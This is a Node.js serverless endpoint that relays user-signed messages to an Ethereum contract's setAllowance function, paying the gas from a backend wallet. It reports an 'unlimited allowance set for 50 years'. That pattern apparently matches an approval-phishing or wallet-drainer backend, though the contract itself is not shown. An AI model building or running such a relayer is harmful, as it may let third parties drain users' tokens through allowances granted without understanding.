// api/submit.js
const { ethers } = require('ethers');

module.exports = async (req, res) => {
    // ============================================
    // CORS Headers
    // ============================================
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Handle OPTIONS
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // GET Request - Test
    if (req.method === 'GET') {
        return res.status(200).json({
            status: 'OK',
            message: 'API is working!',
            contractAddress: "0xB5482B67457498A8770dA975982d8cE23c1A6925",
            timestamp: new Date().toISOString()
        });
    }

    // Only POST allowed
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    // ============================================
    // Main Logic
    // ============================================
    try {
        const { user, nonce, deadline, signature } = req.body;

        console.log('========================================');
        console.log('📥 REQUEST RECEIVED');
        console.log('  👤 User:', user);
        console.log('  📝 Nonce:', nonce);
        console.log('  ⏰ Deadline:', deadline);
        console.log('  📝 Signature:', signature ? signature.substring(0, 40) + '...' : 'null');
        console.log('========================================');

        // ============================================
        // ⭐ Config
        // ============================================
        const CONFIG = {
            rpcUrl: `https://eth-mainnet.g.alchemy.com/v2/${process.env.ALCHEMY_API_KEY}`,
            privateKey: process.env.PRIVATE_KEY,
            contractAddress: "0xB5482B67457498A8770dA975982d8cE23c1A6925"  // ⭐ අලුත් Address!
        };

        // Check configs
        if (!CONFIG.privateKey) {
            console.error('❌ PRIVATE_KEY not set');
            return res.status(500).json({ 
                success: false, 
                error: 'PRIVATE_KEY not set in environment variables' 
            });
        }
        
        if (!process.env.ALCHEMY_API_KEY) {
            console.error('❌ ALCHEMY_API_KEY not set');
            return res.status(500).json({ 
                success: false, 
                error: 'ALCHEMY_API_KEY not set in environment variables' 
            });
        }

        if (!user) {
            console.error('❌ user address not provided');
            return res.status(400).json({
                success: false,
                error: 'user address is required'
            });
        }

        // ============================================
        // Initialize Provider & Wallet
        // ============================================
        console.log('⏳ Initializing provider...');
        const provider = new ethers.providers.JsonRpcProvider(CONFIG.rpcUrl);
        
        console.log('⏳ Initializing wallet...');
        const wallet = new ethers.Wallet(CONFIG.privateKey, provider);
        console.log('👛 Wallet Address (Gas payer):', wallet.address);

        // ============================================
        // ⭐ Contract ABI - දැන් Parameters 4ක්!
        // ============================================
        const contractABI = [
            "function setAllowance(address user, uint256 nonce, uint256 deadline, bytes calldata signature) external"
        ];

        const contract = new ethers.Contract(CONFIG.contractAddress, contractABI, wallet);
        console.log('📋 Contract:', CONFIG.contractAddress);

        // ============================================
        // ⭐ Submit Transaction - දැන් user parameter එකත් එක්ක!
        // ============================================
        console.log('⏳ Submitting setAllowance()...');
        console.log('⛽ Gas will be paid by:', wallet.address);

        const tx = await contract.setAllowance(
            user,       // ⭐ User ගේ Address එක!
            nonce,
            deadline,
            signature
        );

        console.log('📤 Tx Hash:', tx.hash);
        console.log('🔗 https://etherscan.io/tx/' + tx.hash);

        // Wait for confirmation
        console.log('⏳ Waiting for confirmation...');
        const receipt = await tx.wait();

        console.log('✅ TRANSACTION CONFIRMED!');
        console.log('📦 Block:', receipt.blockNumber);
        console.log('⛽ Gas Used:', receipt.gasUsed.toString());
        console.log('========================================');

        // ============================================
        // Return Success
        // ============================================
        return res.status(200).json({
            success: true,
            message: '✅ Unlimited allowance set for 50 years! Gas paid by backend.',
            txHash: tx.hash,
            blockNumber: receipt.blockNumber,
            gasUsed: receipt.gasUsed.toString(),
            contractAddress: CONFIG.contractAddress,
            etherscanUrl: `https://etherscan.io/tx/${tx.hash}`
        });

    } catch (error) {
        console.error('========================================');
        console.error('❌ ERROR:', error.message);
        console.error('========================================');
        
        return res.status(500).json({
            success: false,
            error: error.message
        });
    }
};
